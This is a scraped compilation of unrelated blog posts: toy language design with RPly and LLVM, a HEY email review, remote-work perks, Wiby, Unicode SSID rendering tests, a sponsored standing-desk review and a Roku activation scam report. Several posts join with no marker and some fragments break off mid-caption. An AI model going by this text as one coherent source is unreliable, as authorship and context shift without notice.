about heap use, allow the programmer to specify custom resource
trackers.
An object that registers a finalizer would also tell the runtime
how much pressure the new object applies to a resource.
If the resource is near exhaustion, the runtime collects objects
that are both unreachable in memory and use the particular
resource and collects them.</p>

<p>If you build such a language, I would like to try it.
You could even do it as an extension to an existing language like
Go, though you would have to fork the runtime.</p>

<p>Otherwise, I believe I have one very small use for finalizers as
they exist today, which I will talk about in a followup blog post.</p>

July 3, 2020 | https://joshsharp.com.au/blog/never-been-an-easier-time-to-write-a-language.html | <a href="https://web.archive.org/web/*/https://joshsharp.com.au/blog/never-been-an-easier-time-to-write-a-language.html">archive.org</a>

        <div>

            

            <p>As programming matures and shifts to higher-level abstractions, it becomes more and more about assembling
pre-made building blocks and less about writing new, novel solutions of your own. When I create web apps
(the bread and butter of my day job) I'm using an open-source OS, programming language, database, database
connector library, web server, web framework, authentication libraries, API libraries, payment service libraries...
You get the idea. Increasingly the code I write is "glue" code, simply binding together my building
blocks in the correct order, like a more complicated <a href="https://ifttt.com/">IFTTT</a>, or textual Lego.</p>

<p>It's not surprising that this collection of building blocks is expanding to encompass ever-more-complicated
areas of programming. Today, it's possible to build a simple programming language in the same way you'd
build a web app.</p>


<h3 id="what-s-involved-in-writing-a-language-">What's involved in writing a language?</h3>
<p>The components of a language usually boil down to a "front-end" and a "back-end".</p>
<p>The front-end traditionally consists of a lexer, for turning raw source code into tokens based on grammar
rules, and a parser, for turning tokens into an Abstract Syntax Tree, or AST — nested blocks that represent
operations.</p>
<p>The back-end is the "compiler" which performs steps like type-checking, optimisation, and finally converting
the AST into a lower-level representation. If you're writing an interpreted language, this lower-level is
probably bytecode, rather than an executable, and a corresponding interpreter which reads
and performs bytecode instructions. For example, Python is an interpreted language where <code>.py</code> denotes the raw
source code file, and <code>.pyc</code> the compiled bytecode. When first running a <code>.py</code> file, Python will build a
bytecode-compiled equivalent it can run next time (until your source changes, anyway). If instead you're writing
a compiled language, your back-end builds native executables that can be run directly by the OS.</p>
<p>So once you have a grammar for your syntax, to plug into your front-end, and you can compile the resulting
AST with your back-end, what else is there to do? Well, don't forget about writing a standard library —
defining your built-in types, classes (if you have those), and all of the standard functions to
operate on them. This step is at least as much work.</p>
<h3 id="why-is-it-so-easy-then-">Why is it so easy then?</h3>
<p>If you're writing a language today, many of the parts we defined above already exist for you. Your back-end
and your front-end can both be built out of existing parts.</p>
<p>There are plenty of lexers and parsers available — for example, Lexx and Yacc are a venerable
lexing and parsing combo that have spawned countless modern interpretations. <a href="https://rply.readthedocs.org/">RPly</a>
(RPython Lexx/Yacc) is my current tool of choice in this area. If you use a lexer and parser, the work
left for you is to write your grammar rules, objects representing your AST, and simple functions
telling the parser how to turn grammar into AST. Defining a grammar and an AST are fun! If your syntax
is simple, this step probably won't be that hard either.</p>
<p>For the back-end, <a href="http://llvm.org/">LLVM</a> is the most well-known and respected tool for the job. LLVM powers Clang,
a C and C++ compiler, and other well-known languages like Rust and Swift. The beauty of LLVM is its
Intermediate Representation, or IR. IR looks a lot like assembly language, or really ugly C, but if
you're up for translating your language to LLVM IR, LLVM will take care of optimising and compiling this to a
native executable for you! This is huge. It can even be run in interpreted mode for debugging, or used
as a Just-In-Time (JIT) compiler within your interpreter, if that's your jam.</p>
<p>Fortunately you needn't write IR by hand. Because LLVM has a C interface, there are many LLVM libraries
in many languages to help you create your IR. <a href="http://llvmlite.pydata.org/">Llvm-lite</a> is the most mature Python binding I found,
and what I'm currently using. Essentially, using llvm-lite means you can ask it to create a new function definition for you,
for example, and it'll take care of generating the right IR syntax, and give you back a higher-level interface
for managing variables and code blocks within.</p>
<p>So with this combination of pieces, many of the trickiest parts of writing a language can be wholly outsourced.</p>
<p>Let me give you a concrete example. I'll use my current toy language, written in Python, to demonstrate
how it all goes together:</p>
<ul>
<li>I write a list of tokens (essentially a set of strings) in Python, and feed them to RPly's lexer</li>
<li>I create a Python class to represent each type of AST node or block of code (a function, an if statement, and so on)</li>
<li>I write a set of grammar rules in Python, telling it how to turn tokens into AST instances, and feed them to RPly's parser</li>
<li>I write a compiler class which can turn each AST type into LLVM IR using llvm-lite</li>
</ul>
<p>Then, to compile some source code:</p>
<ul>
<li>The lexer turns my source into tokens</li>
<li>The parser turns tokens into AST</li>
<li>The compiler turns AST into IR, and dumps it to a file</li>
<li>I use the <code>llc</code> tool to compile from IR to an object file</li>
<li>I use <code>gcc</code> to compile that file into an executable</li>
</ul>
<p>Voila, a working program I can run. It can't do much without a standard library, but if I define
the grammar and AST for some "binary operations" like addition and substraction, I can compile
simple arithmetic and return or print the result.</p>
<p>What I'm trying to get at is that once you decide on a grammar for your language, most of the code you
write is glue, turning output from one library into input for another. Of course, this glue code
can get quite complex, but for the modern language developer, so much is already done for you and ready
to plug in. If you have some ideas for a language, it's never been easier to try them out.</p>

<p>After I got my HEY invite during its first week of launch, I started enjoying email again.</p>



<p>I now have a better email workflow using HEY than what I had using Gmail or Spark or even the Apple Mail app.</p>



<p>In this post, I’ll share my HEY workflow and talk about why I chose to pay $99/year for email.</p>



<h2 id="pay-using-data-or-money">Pay using data, or money</h2>



<p>Even before I came across this tweet from DHH, I was already paying for email.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">The first brand-new product from us at Basecamp in many years is coming this April: An email service (not a client) built for people who both love and hate email. We'll fix the hate, and leave you with the love. Email is amazing, and it deserves our best. <a href="https://t.co/J7OCCTFX2Z">https://t.co/J7OCCTFX2Z</a></p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1225487645268160512?ref_src=twsrc%5Etfw">February 6, 2020</a></blockquote>
</div></figure>



<p>I had shifted from free email to a paid one on <a href="https://www.fastmail.com/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">Fastmail</a> back in December 2019.</p>



<p>There we two core reasons behind this decision:</p>



<ul><li><strong>Data privacy. </strong>It was time I stopped tech giants like Google from harvesting my personal and financial data for ads.</li><li><strong>Truly owning my email address.</strong> With a free email on a shared domain, you never truly own your email address. It’s just a rental that might vanish anytime the service provider wishes. Having my email on a custom domain meant I could hold that email address as long as I wished. Also, I could change providers anytime without changing my email address.</li></ul>



<figure><blockquote><p>If you’re not paying for a product, then you are the product.</p></blockquote></figure>



<p>With HEY, the first problem is solved. I’m paying them for their service which leaves out negligible motive for them to mine my data for profit.</p>



<p>And, HEY’s not cheap. It’s $99/year which comes down to $8.25/month. I was paying $5/month on Fastmail.</p>



<p>Apart from the super expensive Superhuman email client, HEY stacks up amongst the top-tier of email providers when it comes to pricing.</p>



<p>However, paying money doesn’t automatically mean they will not snoop on my data. I remember almost paying for <a href="https://otter.ai/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">Otter</a> and then quickly removing it from my phone when I went through <a href="https://blog.otter.ai/privacy-policy/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">their privacy policy</a>.</p>



<p>To dig deep, I went over HEY’s privacy policy, and it checked out. No major red flags.</p>



<p>I did say major because there were a couple of quirks including:</p>



<ul><li>Cookies to track user activity.</li><li>Not respecting a Do Not Track request.</li></ul>



<p>However, I can live with that.</p>



<p>But, what about the lecture on truly owning an email address?</p>



<p>It turns out; HEY offers that too.</p>



<p>Although, there is no support for custom domains as of now, they do commit to roll out the feature later this year.</p>



<p>Here’s a reply from DHH on my tweet:</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">No custom domains at launch. But a commitment to do them later this year 🤘</p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1265687931135524866?ref_src=twsrc%5Etfw">May 27, 2020</a></blockquote>

<p>But, that’s not all. If you pay for at least one year of HEY which is $99, you get to keep your @hey.com email address, forever.</p>



<p>If I cancel my HEY account next year, I would still be able to receive emails on my @hey.com address if I choose to forward all incoming emails to a new address.</p>



<p>It seems pretty reasonable.</p>



<p>We receive a lot of emails, including sensitive ones like password reset and transaction logs on our email address. Being held hostage and asked to pay a ransom of $99/year just to keep the email address would have been unethical.</p>



<p>Although, I don’t want to move away from HEY anytime soon, this option seems like a good backup strategy.</p>



<h2 id="privacy-aside-i-also-love-hey-for-these-features">Privacy aside, I also love HEY for these features</h2>



<p>If HEY offered only privacy, I would have happily stuck to Fastmail. I was getting a good enough privacy-friendly email for half the price when paid yearly.</p>



<p>But, HEY’s more than just a privacy-friendly email.</p>



<p>Let’s start with:</p>



<h3 id="the-screener">The screener</h3>



<p>The screening feature is a game-changer for me.</p>



<p>I used to do all the hard work of making a filtering rule on my Gmail and Fastmail to weed out any unnecessary emails, but HEY makes it so easy.</p>

<p>Filtering out was a second step in my “konmari” inbox process. My first step was to unsubscribe manually or by using a tool like <a href="https://leavemealone.app/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">LeaveMeAlone</a>.</p>



<p>If I kept getting emails even after unsubscribing, I wrote filtering rules.</p>



<p>HEY screening is the reverse of what I was used to, and it made total sense. I regularly screen-in or screen-out emails and keep my actual email workspace tidy.</p>



<p>Instead of reacting to spammy senders, I am proactively blocking them out of my inbox.</p>



<p>For example, I recently subscribed to the <strong>Dense Discovery</strong> newsletter, and the verification email landed on my screener:</p>

<p>I have seen tweets about why the screener is only helpful for famous people who get tons of emails from unknown senders. I don’t think that’s the case.</p>



<p>This feature has been super helpful for me because I get spammed by a ton of agencies to buy their services.</p>

<p>What’s the worst part?</p>



<p>They usually don’t have unsubscribe links and often send the same email from different addresses.</p>



<p>Even the filters won’t permanently block these senders from reaching my inbox and cluttering it up.</p>



<p>With HEY, they never get past the screening list. If I ever change my mind about a sender, I can always screen them back in on the <a aria-label="undefined (opens in a new tab)" href="https://app.hey.com/my/clearances" target="_blank" rel="noreferrer noopener nofollow">Screener History page</a>.</p>



<p>For some people, screening might seem like a lot of work. For me, it’s an organising feature I love.</p>



<p>Talking about newsletters:</p>



<h3 id="the-feed-page-is-a-delight">The feed page is a delight</h3>



<p>HEY’s <a aria-label="undefined (opens in a new tab)" href="https://app.hey.com/feedbox" target="_blank" rel="noreferrer noopener nofollow">feed page</a> is how newsletters should be read.</p>



<p>We are already used to reading posts on social media in a linear feed. </p>



<p>Why not have the same approach for newsletters? They’re mostly like social media posts.</p>

<p>I usually visit this page 2-3 times a day and scan through the newsletters I receive.</p>



<p>Unlike Gmail or Spark, HEY doesn’t have a machine learning system to automatically sort emails into their respective folders.</p>



<p>Frankly, I would have enjoyed an automatic sorting process, but the manual sorting works for me as well. Maybe because I’m a neat-freak but well, what works, works.</p>



<p>To make sure newsletters land on the Feed page, you need to mark the sender’s delivery options on the sender’s contact page:</p>

<p>The same can also be <a aria-label="undefined (opens in a new tab)" href="https://youtu.be/UCeYTysLyGI?t=913" target="_blank" rel="noreferrer noopener nofollow">done on the screening page</a>. I usually sort emails on my screening page. It’s easier.</p>



<p>Another source of frequent emails which I don’t need to see right now are transaction logs.</p>



<p>With HEY:</p>



<h3 id="paper-trail-has-got-me-covered">Paper trail has got me covered</h3>



<p>For me, and I’m sure for a lot of you, transaction receipts are good for referring later on.</p>



<p>I don’t need to see them on my inbox. Neither do I need to read them right now.</p>



<p>The <a href="https://app.hey.com/paper_trail" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">paper trail page</a> in HEY does precisely that.</p>

<p>Marking a sender to deliver to paper trail (the same way we marked newsletters for feed), delivers all emails from them to a separate section out of my Imbox.</p>



<p>How is this any different from what Gmail does?</p>



<p>I don’t have to mark the emails as read. They are already in a read state.</p>



<p>I usually open this page up to verify a recent transaction.</p>



<p>Talking about transaction receipts:</p>



<h3 id="hey-has-a-central-place-for-attachments">HEY has a central place for attachments</h3>



<p>How this helps is I can view all attachments from a sender and filter by file type in a single page.</p>

<p>It’s useful in situations where you don’t precisely remember the particular email an attachment was on but know the who sent it to you.</p>



<p>I have had several such moments in the past. Probably that’s why this feature is so important to me.</p>



<p>Apart from these prominent features:</p>



<h3 id="i-like-how-i-can-reply-later-or-keep-aside-my-emails">I like how I can reply later or keep aside my emails</h3>



<p>Keep aside and reply later are those tiny features which fit into my workflow without disrupting it.</p>



<p>On my regular inbox with Gmail and Spark, I used to keep emails in my inbox, which I needed to refer or maybe reply to in some time.</p>



<p>This approach ensured I didn’t miss out on stuff that I need to get back to in the near future.</p>



<p>With HEY’s keep aside and reply later functionality, the organisation became a little easier and cleaner.</p>



<p>It’s what we software engineers call “separation of concerns”.</p>

Reply later, and 2. Keep aside</figcaption></figure></div>



<p>Some use cases where these features fit in:</p>



<ul><li><strong>Reply later: </strong>This is helpful when I know I need to get back with a response to an email, but now is not the correct time. I stash the email away to reply later and then reply when I have time.</li><li><strong>Keep aside</strong>: I find this useful for cases like waiting for a settlement to process or maybe some purchase that for which I’ll get a final confirmation a few days later.</li></ul>



<p>Also, there were times where I moved an email from keep aside to reply later when I didn’t hear back from the sender in a few days.</p>



<p>In a sense, both features go hand in hand to make your email processing easier.</p>



<p>It feels good not to have to apply hacks to get something done.</p>



<p>As <a aria-label="undefined (opens in a new tab)" href="https://twitter.com/jasonfried" target="_blank" rel="noreferrer noopener nofollow">Jason Fried</a> likes to say:</p>



<figure><blockquote><p>HEY is all about workflows, not workarounds.</p></blockquote></figure>



<p>Aside from all these great features, HEY is not a total joyride. It has its share of quirks.</p>



<h2 id="there's-room-for-improvement">There’s room for improvement</h2>



<p>HEY is still at a very early stage. Therefore, it’s safe to say that there will be a lot of iterations in the future, which will make the product even better.</p>



<p>As of now, here are the things about HEY that I don’t wholly enjoy:</p>



<h3 id="the-ui">The UI</h3>



<p>When I first saw HEY, I was convinced that I’d ditch it after a few days of use.</p>



<p>I’m more of a clean and sharp design kind of guy. HEY was playful and bold.</p>



<p>I was wrong.</p>



<p>After using HEY for about two days, the UI grew on me. The boldness and fun aspect of the UI made me excited about email once again.</p>



<p>I can’t remember when I was as excited to email someone as I am right now. Email is fun again.</p>



<p>There are still some parts of the UI that I haven’t been able to accept. One of them is the dark mode.</p>



<p>Take this email, for example:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Perks and benefits are a huge part of hiring and retaining top talent and keeping people happy. They are not only a set of goodies and benefits to keep your people happy but a substantial part of the employment package. For remote companies, the perk packages often look a little bit different and may include things that aren't usual in any other company.</p>
<h2>Perks and Benefits in co-located companies</h2>
<p>Depending on where you live, companies tend to offer free drinks, snacks and fruits to their employees. They usually have a set of PTO days – depending on the country between 10 to 30 – and pre-defined parental leaves. Talking about time off, many companies also offer sabbatical offerings. Basecamp, for example, offers <a href="https://basecamp.com/about/jobs">a full month off after every three years</a> of employment.</p>
<p>Many other offerings do not involve paid time off and consist of a pre-defined period you can take off unpaid if you so wish. Most companies also offer pension packages, some offer paid health/sports perks, sometimes even education stipends and paid conference visits too.</p>
<p>If you work at a bigger company or in one of the tech hubs, such as San Francisco or New York, for example, it's not uncommon to see companies offer free catered lunches as well. Google is notorious for offering over-the-top perks, anything from on-site gyms to hairstylists.</p>
<h2>Recommended Benefits for Remote Employees</h2>
<p>Remote employees have other requirements for a good perk system. They don't need catered lunches, because they can cook or order whatever they want. They don't need an on-site hairstylist, because they can go to their local one, and having flexible time as a perk doesn't make sense if you can plan your day by yourself.</p>
<p>Thinking of it, having a good remote-first working structure is already a great perk, but there is more that should be part of a remote work package.</p>
<h3>Coworking Stipend</h3>
<p><a href="https://nohq.co/blog/mental-health-hacks-for-your-remote-team/">Remote work can be lonely</a>, and a welcome change to the home office may be the casual trip to a local co-working space. If applicable, employers should try to get all of their employees a hot-seat card for a local coworking space (meaning they can visit and grab a seat so-and-so many times per month, not a fixed desk). This can be crucial if an employee is otherwise mostly isolated (e.g. in a very different timezone). At times, a fixed full-month seat may need to be supplied.</p>
<h3>Locally adjusted healthcare benefits</h3>
<p>Health insurance is different in every country. While US employers tend to offer extensive healthcare benefits, it can be unusual or even useless in many other countries (e.g. if healthcare is mostly free). Adjust for local differences, possibly offer an annual health stipend if applicable.</p>
<h3><strong>Equipment for home office</strong></h3>
<p>If you expect people to work from home (or anywhere), you should supply anything you'd supply for a co-located employee. Meaning (if needed) a great table, chair, screen, computer, any accessories needed, as well as internet access (at least subsidized). This may differ from employee to employee, as people tend to have a small existing home office at times. It can be good to offer a hardware stipend upfront (usually between $2,000 and $3,000) to cover all expenses of a home office.</p>
<h3><strong>Education stipend</strong></h3>
<p>A big downside of working remotely? <a href="https://nohq.co/blog/casual-conversation-in-remote-teams/">No casual chats with your coworkers</a> to learn something new, no easy knowledge exchange over multiple days, rarely a full-company talk or workshop. Learning new things get harder, the less connected you are. A stipend for educational material makes it easy for your employees to grow and learn.</p>
<p>Supplying topical books, courses, subscriptions and similar is also in your interest. It doesn't only help people to grow, but also bring new ideas into your business.</p>
<h3><strong>Company-wide team retreats</strong></h3>
<p>The sweet thing about not having an office, or renting something small, is saving a lot of money on rent. The best way to re-invest that money is by <a href="https://zapier.com/learn/remote-work/how-run-company-retreat-remote-team/">flying the whole team out for a retreat</a>, either to an existing HQ or a remote location, for 1-2 weeks of team building, strategy planning, brainstorming, innovation and exchange. This can get costly, but is crucial to do! Face-to-face time can't get substituted with anything, you'll be left with a tighter, happier and greater team.</p>
<p>Optionally, fly out smaller groups or teams to get them together and have in-person sessions to plan the future and do team-building, it will work wonders for your team culture!</p>
<h2>How to pay or reimburse perks</h2>
<p>Many of these perks wouldn't be called 'perks' in the traditional sense, because of a simple reason: They just mean more money in your employee's hands. Unless you are working with a <a href="https://nohq.co/tools/deel/">benefits partner</a>, these perks consist of things that folks can get reimbursed.</p>
<p>Be it books, as part of the education stipend, or healthcare benefits. It would be too much work to pay people's bills, worry about local regulation or taxes – the easiest way is to just reimburse your employees (or contractors).</p>
<p>Perks don't have to be readily available snacks or catered lunches – paying for education or reimbursing healthcare costs is just as much a perk. As a remote company, you're already offering a great perk with people being able to work independently. Taking off some load and reimbursing annoying, recurring costs is just the cherry on top!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Search engines like Google have become indispensable, able to find answers to all of your technical questions; but along the way, the fun of web surfing was lost.
</p><p>
In the early days of the web, pages were made primarily by hobbyists, academics, and computer savvy people about subjects they were personally interested in. Later on, the web became saturated with commercial pages that overcrowded everything else. All the personalized websites are hidden among a pile of commercial pages. Google isn't great at finding them, its focus is on finding answers to technical questions, and it works well; but finding things you didn't know you wanted to know, which was the real joy of web surfing, no longer happens. In addition, many pages today are created using bloated scripts that add slick cosmetic features in order to mask the lack of content available on them. Those pages contribute to the blandness of today's web.
</p><p>
The Wiby search engine is building a web of pages as it was in the earlier days of the internet. In addition, Wiby helps vintage computers to continue browsing the web, as pages indexed are more suitable for their performance.</p><p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>This is a continuation of my previous post <a href="https://hamptonmoore.com/posts/weird-wifi-name-display/">Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”</a>. After posting it on HackerNews I got lots of feedback. The key one was something that I had sadly missed when I originally started this project. When the WiFi name of “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa” got shortened down to a one byte before the second “a” due to the 32 byte/octet limit of SSIDs. The issue was this character is actually two bytes wide, so the first part of the character stayed, with the second byte of it missing. The character in question was ◌̈́, with the hex codepoint cd84. Looking at the raw hex of the SSID you can see it ends in cd, <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>. For those curious about how that would be rendered on your device here it is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�”. After realizing this I decided my previous comparisons of how devices reacted to my weird unicode SSID was unfair. The SSID this time is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” which is almost the exact same but that last two byte long character was replaced with an “a”. This was to keep the SSID at 32 octets long. Looking at the new hex of the SSID <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc9161</code> you can see that is is identical baring the <code>61</code> instead of a <code>cd</code> at the end.</p> <p>Below are the previous photos of the previous SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�” with the new SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” under it. They are also grouped the same as previously to keep continuity.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/firestick.jpg" alt=""></p> <p>As before the Galaxy S8 and the Firestick both handled it perfectly with there being no issues with how it rendered besides vertical cutoff which makes sense.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/appletvgen2.jpg" alt=""></p> <p>These results were interesting. It showed that if the UTF-8 character in an SSID is invalid then IOS falls back to the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set, but since the new SSID is valid UTF-8 iOS properly renderers the SSID.</p> <p>2012 Macbook running High Sierra 10.13.6 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/macos.jpg" alt=""></p> <p>Unlike last time the Macbook actually showed the network. I believe last time instead of falling back to Mac OS Roman like iOS the Macbook just treated the SSID as spam or noise and dropped it</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/windows10.jpg" alt=""></p> <p>Windows was able to properly handle this SSID as opposed to falling back to <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a> like it did previously.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/chromeos.jpg" alt=""></p> <p>Unlike last time the Chromebook was able to render this perfectly with no question marks.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/kindlepaperwhite.jpg?" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/viziom55-c2.jpg" alt=""></p> <p>Unlike last time the kindle was able to show the SSID without escape any of the characters. Sadly the Vizio was not able to show the SSID and just fell back to escaped hex.</p> <p>The results from changing the SSID showed a couple things, namely devices really do not like it when they are given invalid or incomplete UTF-8 codes and lots of devices handle UTF-8 text much better than I thought they would. It also showed that some devices fallback to their native 8 bit encoding formats when they see an invalid UTF-8 codepoint, there is probably some room for exploitation here like inserting escape keys. I originally was not expecting the kindle to work at all, nor the chromebook after seeing the slew of question marks originally. Android was also found to be at handling text with invalid UTF-8 characters it just removed them as opposed to switching up formatting, falling back to hex, or erroring out with all question marks.</p> <p>Thank you to everyone who provided valuable feedback on the previous post. I have more research I plan ond doing with this in the future.</p> <p>Lastly if anyone would like to run this test themselves and send me the comparison results to be added my email is <code>me (at) hampton (This key &gt; not shifted) pw</code>.</p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>

<div>
<p>I’ve been using a <a href="https://timleland.com/ergo-depot-jarvis-standing-desks-review/">standing desk</a> for over 5 years now and really enjoy being able to sit and stand throughout the day. There are many health benefits of a standing desk that I will not cover in this post, but I will say being able to stand and work has helped me stay healthy while working at a desk for extended periods of time.</p>
<p>Since working from home, I’ve needed more desk space for additional monitors. My <a href="https://timleland.com/ergo-depot-jarvis-standing-desks-review/">previous standing desk</a> was only 4 ft long and my <a href="https://timleland.com/dell-34-ultra-wide-monitor-review-u3417w/">34″ monitor</a> spanned almost the entire desk. <a href="https://www.autonomous.ai/?utm_source=Press&amp;utm_medium=Timleland_press&amp;utm_campaign=No&amp;utm_content=No">Autonomous</a> was kind enough to send me a desk to review.<span id="more-10251"></span></p>
<p><a href="https://www.autonomous.ai/?utm_source=Press&amp;utm_medium=Timleland_press&amp;utm_campaign=No&amp;utm_content=No">Autonomous</a> is a well-known company that has been around since 2015 focusing on the “smart office” primarily <a href="https://www.autonomous.ai/office-chairs">office chairs</a> and <a href="https://www.autonomous.ai/standing-desks?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">standing desk</a>.&nbsp;From my research, they make the <a href="https://www.autonomous.ai/smart-officee?utm_source=Press&amp;utm_medium=Timleland_press&amp;utm_campaign=No&amp;utm_content=No">most affordable standing desk</a> on the market starting at $379. That is about half of what I paid for a similar desk 5 years ago. I decided to go with the <a href="https://www.autonomous.ai/standing-desks/smartdesk-2-home?utm_source=Press&amp;utm_medium=Timleland_press&amp;utm_campaign=No&amp;utm_content=No">SmartDesk 2 Premium</a> XL with black legs and a walnut top which cost around $569. The XL is 70″ long which is perfect if you need more space for additional monitors. They also sell an <a href="https://www.autonomous.ai/standing-desks/l-shaped-smartdesk?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">L shaped desk</a> for $739 which is another great option if you have space for it. Other companies sell L shaped desk for double that price. It pretty amazing how they are able to sell the best affordable standing desk at these prices.</p>
<p>The XL top comes with 2 grommets that are great for cable management. I recommend using a <a href="https://www.autonomous.ai/office-accessories/cable-tray?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">cable tray</a> or zip ties to keep your cables neat under the desk.</p>
<h3>Pros</h3>
<ul>
<li>Affordable adjustable standing desk</li>
<li>Customizable options</li>
<li>Quality materials</li>
<li>Easy to assemble</li>
<li>Programmable height</li>
</ul>
<h3>Cons</h3>
<ul>
<li>Included Allen wrench did not work well</li>
<li>Wish the <a href="https://www.autonomous.ai/office-accessories/cable-tray?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">Cable Tray</a> was included</li>
</ul>
<p>Overall I am extremely happy with <a href="https://www.autonomous.ai/standing-desks/smartdesk-2-business?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">SmartDesk 2 Premium</a> from Autonomous. I give it a 5 out of 5 compared to the other standing desk I have used. They make great products at affordable prices. If you have been considering a standing desk or office chair you cannot go wrong with <a href="https://www.autonomous.ai/?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">Autonomous</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>New Roku and other streaming device users beware. These scammers are running a large network of lookalike websites tricking into paying “activation” or “set-up” fees for something coming free of charges.</p>
<p>How do these scams work? What Roku scam websites belong to the same circle of scammers? Read on to find out.</p>

<h2 id="how-the-scam-works">How the scam works</h2>
<p>The spiel is that if someone is trying to activate a streaming device and Googles <em>“Roku activation”</em>, paid ads would pop up within the search results all leading to the scammy sites.</p>
<div><blockquote><p lang="en" dir="ltr">Top 4 results on Google (in a private window with uBlock Origin disabled) are all fake sites which lead to 800 numbers to scammers. <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/RokuSupport?ref_src=twsrc%5Etfw">@RokuSupport</a> needs to step in here and take these down. <a rel="nofollow noopener noreferrer" target="_blank" href="https://t.co/yzSoEzHfhx">pic.twitter.com/yzSoEzHfhx</a></p>— Michael | Unstable World (@esposimi) <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/esposimi/status/1262432472794574855?ref_src=twsrc%5Etfw">May 18, 2020</a></blockquote>

</div>
<p>The <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.wave3.com/2020/05/15/bbb-warns-about-roku-activation-scam/">victims are then asked to pay</a> a one-off activation fee and/or a substantial charge for tech support services not required in the first place. Needless to say, these lookalike websites are not related to Roku in any capacity. <a rel="nofollow noopener noreferrer" target="_blank" href="https://support.roku.com/article/208757068">Roku device activation</a> at <em>roku.com/link</em> and general tech support from Roku is free of charge.</p>

</div>
<p>In sum, these lookalike websites are created and pushed on Google Ads to give the victims an impression that the website is associated with Roku and a payment fee is required to get started.</p>
<h2 id="same-scam-different-shill">Same scam different shill</h2>
